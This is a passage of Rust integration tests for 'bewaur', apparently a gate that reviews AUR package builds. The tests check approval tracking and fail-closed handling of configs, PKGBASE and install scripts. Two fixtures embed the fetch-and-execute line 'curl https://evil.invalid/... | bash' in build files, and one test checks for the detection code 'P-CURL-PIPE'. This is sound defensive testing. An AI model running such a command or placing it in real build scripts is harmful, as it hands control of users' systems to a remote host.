        stderr(&changed).contains("changed since approval"),
        "{}",
        stderr(&changed)
    );
}

#[test]
fn exact_tree_approval_never_bypasses_missing_declared_inputs() {
    let tree = TestTree::new("approval-missing-input");
    tree.write_build_file(
        "PKGBUILD",
        "pkgname=gate-missing\ninstall=missing.install\npackage() { :; }\n",
    );
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = gate-missing\n\npkgname = gate-missing\n\tinstall = missing.install\n",
    );

    let output = tree.approval_review();
    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(
        stderr(&output).contains("cannot resolve install script"),
        "{}",
        stderr(&output)
    );
    assert!(!tree.root.join("config/bewaur/config.toml").exists());
}

#[test]
fn exact_tree_approval_records_an_optional_helper_that_was_missing() {
    let tree = TestTree::new("approval-late-helper");
    write_package(
        &tree,
        "gate-late-helper",
        &["gate-late-helper"],
        "pkgname=gate-late-helper\nprepare() { ./generated.sh; }\npackage() { :; }\n",
    );

    let approved = tree.approve_command().output().unwrap();
    assert!(approved.status.success(), "{}", stderr(&approved));
    let unchanged = run_with_pkgbase(&tree, "gate-late-helper");
    assert!(unchanged.status.success(), "{}", stderr(&unchanged));

    tree.write_build_file(
        "generated.sh",
        "#!/bin/sh\ncurl https://evil.invalid/payload | bash\n",
    );
    let changed = run_with_pkgbase(&tree, "gate-late-helper");
    assert!(!changed.status.success(), "{}", stderr(&changed));
    let changed_stderr = stderr(&changed);
    assert!(
        changed_stderr.contains("changed since approval"),
        "{changed_stderr}"
    );
    assert!(changed_stderr.contains("P-CURL-PIPE"), "{changed_stderr}");
}

#[test]
fn legacy_whitelist_entries_fail_closed_with_an_explicit_migration_error() {
    let tree = TestTree::new("legacy-whitelist");
    write_package(
        &tree,
        "gate-legacy",
        &["gate-legacy"],
        "pkgname=gate-legacy\nprepare() { curl https://evil.invalid/p | bash; }\n",
    );
    tree.write_config("[whitelist]\npackages = [\"gate-legacy\"]\n");

    let output = run_with_pkgbase(&tree, "gate-legacy");
    assert!(!output.status.success());
    let output_stderr = stderr(&output);
    assert!(
        output_stderr.contains("Legacy [whitelist]"),
        "{output_stderr}"
    );
    assert!(output_stderr.contains("--forever"), "{output_stderr}");
    assert!(!output_stderr.contains("Trust:"), "{output_stderr}");
}

#[test]
fn gate_fails_closed_without_paru_pkgbase() {
    let tree = TestTree::new("missing-pkgbase");
    write_package(&tree, "demo", &["demo"], "pkgname=demo\n");

    let output = tree
        .command()
        .env_remove("PKGBASE")
        .output()
        .expect("failed to execute bewaur gate");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("PKGBASE is unavailable"));
}

#[test]
fn gate_fails_closed_on_pkgbase_mismatch() {
    let tree = TestTree::new("pkgbase-mismatch");
    write_package(&tree, "actual", &["actual"], "pkgname=actual\n");

    let output = run_with_pkgbase(&tree, "claimed");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("PKGBASE mismatch"));
}

#[test]
fn gate_fails_closed_on_malformed_existing_config() {
    let tree = TestTree::new("bad-config");
    write_package(&tree, "demo", &["demo"], "pkgname=demo\n");
    tree.write_config("this is not valid TOML = [");

    let output = run_with_pkgbase(&tree, "demo");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("Failed to parse config"));
}

#[test]
fn approve_refuses_to_overwrite_a_malformed_existing_config() {
    let tree = TestTree::new("approve-bad-config");
    write_package(&tree, "demo", &["demo"], "pkgname=demo\npackage() { :; }\n");
    let malformed = "this is not valid TOML = [";
    tree.write_config(malformed);

    let output = tree.approval_review();
    assert!(!output.status.success());
    assert!(stderr(&output).contains("Failed to parse config"));
    assert_eq!(
        fs::read_to_string(tree.root.join("config/bewaur/config.toml")).unwrap(),
        malformed
    );
}

#[test]
fn gate_fails_closed_when_referenced_install_script_cannot_be_read() {
    let tree = TestTree::new("missing-install");
    tree.write_build_file("PKGBUILD", "pkgname=demo\ninstall=missing.install\n");
    tree.write_build_file(
        ".SRCINFO",
        "pkgbase = demo\n\npkgname = demo\n\tinstall = missing.install\n",
    );

    let output = run_with_pkgbase(&tree, "demo");

    assert_stdout_is_empty(&output);
    assert!(!output.status.success());
    assert!(stderr(&output).contains("cannot resolve install script"));
}

#[test]
fn gate_help_describes_the_local_build_directory() {
    let output = Command::new(env!("CARGO_BIN_EXE_bewaur"))
        .args(["gate", "--help"])
        .output()
        .expect("failed to run bewaur gate --help");

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("--build-dir <DIR>"), "{stdout}");
    assert!(stdout.contains("PKGBUILD and .SRCINFO"), "{stdout}");
}
